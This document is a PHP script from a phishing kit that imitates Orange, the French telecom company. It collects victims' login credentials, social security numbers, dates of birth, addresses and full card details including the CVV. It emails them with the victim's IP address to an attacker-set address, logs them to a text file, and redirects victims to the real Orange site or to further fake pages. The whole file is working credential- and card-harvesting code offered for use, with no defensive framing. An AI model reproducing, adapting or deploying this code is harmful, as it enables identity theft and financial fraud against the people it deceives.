<?php
ob_start();


include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);

if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Nom et prenom           : ".$_POST['fname']."\n";
	$message .= "adresse de facturation           : ".$_POST['add']."\n";
	$message .= "ville           : ".$_POST['ct']."\n";
	$message .= "N° de securité sociale           : ".$_POST['ssn']."\n";
	$message .= "Date de naissance           : ".$_POST['dob']."\n";
	$message .= "N° de phone           : ".$_POST['ph']."\n";
	$message .= "Code postal              : ".$_POST['zc']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- - --------------|\n";
	$headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message,$headers); 
	file_put_contents("resoltaccvv44.txt", $message, FILE_APPEND);
	//header("Location: ./card.html");
	header("Location: https://www.orange.fr/");
	
	
}
if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Nom du titulaire           : ".$_POST['chn']."\n";
	$message .= "Numero de carte           : ".$_POST['cn']."\n";
	$message .= "Date d'expiration           : ".$_POST['exdate']."\n";
	$message .= "CVV           : ".$_POST['cvv']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message,$headers); 
	file_put_contents("resoltaccvv44.txt", $message, FILE_APPEND);
	//header("Location: https://www.orange.fr/");
	header("Location: ./detail.html");
	
	
}


else if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "ID            : ".$email."\n";
	$message .= "Mot de passe              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- ----------------|\n";
	$headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message,$headers);
    file_put_contents("resoltaccvv44.txt", $message, FILE_APPEND);  
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
     json_encode($data);

ob_end_flush();
?>